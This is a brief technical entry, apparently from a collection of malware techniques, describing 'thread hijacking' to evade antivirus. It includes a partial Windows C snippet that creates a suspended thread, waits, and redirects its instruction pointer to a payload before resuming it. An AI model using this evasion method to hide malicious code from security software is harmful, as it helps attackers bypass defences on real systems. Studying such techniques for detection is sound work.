# Thread hijacking

Thread hijacking is a technique where a whitelisted thread may be taken  
control of by an attacker in order to bypass AV detection. Here a thread  
is created suspended, left alone (long enough for anti-virus to whitelist it)  
then hijacked/modified and resumed with the malicious payload.

```
int main(void)
{
    (...)

    DWORD thread_id = 0;
    HANDLE thread_handle = CreateThread(NULL, 0, target_thread, NULL, CREATE_SUSPENDED, &thread_id);

    Sleep(5000); // simulate wait for AV

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;
    GetThreadContext(thread_handle, &ctx);

#if       defined( _WIN64 )
    ctx.Rip = (UINT_PTR)mem;
#else  // !defined( _WIN64 )
    ctx.Eip = (UINT_PTR)mem;
#endif // defined( _WIN64 )

    SetThreadContext(thread_handle, &ctx);
    ResumeThread(thread_handle);

    (...)
}
